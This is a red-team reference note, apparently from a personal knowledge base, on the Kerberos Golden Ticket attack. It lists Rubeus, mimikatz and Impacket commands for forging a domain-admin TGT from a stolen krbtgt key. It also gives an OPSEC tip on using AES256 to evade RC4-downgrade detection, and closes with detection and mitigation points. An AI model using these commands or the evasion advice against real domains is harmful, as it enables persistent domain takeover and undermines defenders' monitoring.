---
title: Golden Ticket
aliases: ["Golden Ticket"]
type: technique
domain: [red-team]
attack_tactic: [persistence, privesc]
tags: [type/technique, domain/red-team, attack/persistence, proto/kerberos]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[krbtgt account]]", "[[TGT vs TGS]]", "[[PAC]]", "[[DCSync]]", "[[Silver Ticket]]", "[[SID History Abuse]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Golden Ticket

> [!summary] One-liner
> Forge your own TGT using the stolen krbtgt key — a self-signed "domain admin" ticket the KDC will accept for anyone, indefinitely.

## Concept abused
Every [[TGT vs TGS|TGT]] is encrypted/signed with the **[[krbtgt account|krbtgt]] key**. With that key you can mint a TGT with any [[PAC]] (e.g. Domain Admins) — the [[KDC]] trusts it because it's correctly encrypted.

## Prerequisites
- The **krbtgt hash/AES key** (via [[DCSync]] or [[NTDS.dit Extraction]]) and the **domain [[SID]]**.

## Commands & tools
```powershell
# Rubeus
Rubeus.exe golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /ptt
# mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
# mimikatz — AES256 (OPSEC-safe, avoids encryption-downgrade detection)
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /aes256:<aes256_key> /ticket:golden.kirbi
```
```bash
# Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain contoso.local Administrator
```

## Properties
- **Domain-wide**, long-lived; survives password resets of the *user* (it's krbtgt-signed).
- **Killed only by resetting krbtgt twice** (account keeps current+previous key).
- **Encryption type OPSEC**: Using `aes256_hmac` instead of RC4 avoids encryption-downgrade detection (e.g. Microsoft ATA flags RC4 usage in Kerberos). The `kerberos::golden` command supports the `/aes256:<key>` parameter for this purpose.

## Detection / artifacts
TGT with anomalous lifetime/encryption; TGS requests with no preceding AS-REQ; mismatched PAC; krbtgt usage anomalies.

## Mitigation
Protect/rotate krbtgt (reset **twice**), tier-0 isolation, monitor for tickets lacking AS-REQ.

## Related
- Per-service equivalent: [[Silver Ticket]]; cross-domain: add SIDs via [[SID History Abuse]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Golden/Silver ticket"
- [[Source - hackndo blog]]
